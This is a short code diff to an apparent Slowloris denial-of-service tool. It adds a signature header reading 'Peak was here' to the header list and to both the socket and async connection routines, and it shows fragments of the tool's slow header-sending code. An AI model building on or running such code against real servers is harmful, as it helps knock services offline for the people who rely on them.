@@ -166,6 +166,7 @@ extra_headers = [
     ("X-Requested-With", ["XMLHttpRequest", "" ]),
     ("DNT", ["1", "0"]),
     ("Connection", ["keep-alive", "close"]),
+    ("X-Peak-Signature", ["Peak was here", "Peak's Slowloris"]),
 ]
 
 setattr(socket.socket, "send_line", send_line)
@@ -192,6 +193,8 @@ def init_socket(ip: str):
 
     s.send_header("User-Agent", ua)
     s.send_header("Accept-language", "en-US,en,q=0.5")
+    # Add Peak's signature
+    s.send_header("X-Peak-Signature", "Peak was here")
     return s
 
 
@@ -263,6 +266,8 @@ async def slowloris_connection_async(host, port, use_ssl, randuseragent, sleepti
         ua = random.choice(user_agents) if randuseragent else user_agents[0]
         writer.write(f"User-Agent: {ua}\r\n".encode("utf-8"))
         writer.write(b"Accept-language: en-US,en,q=0.5\r\n")
+        # Add Peak's signature
+        writer.write(b"X-Peak-Signature: Peak was here\r\n")
         await writer.drain()
 
         # Randomize extra headers
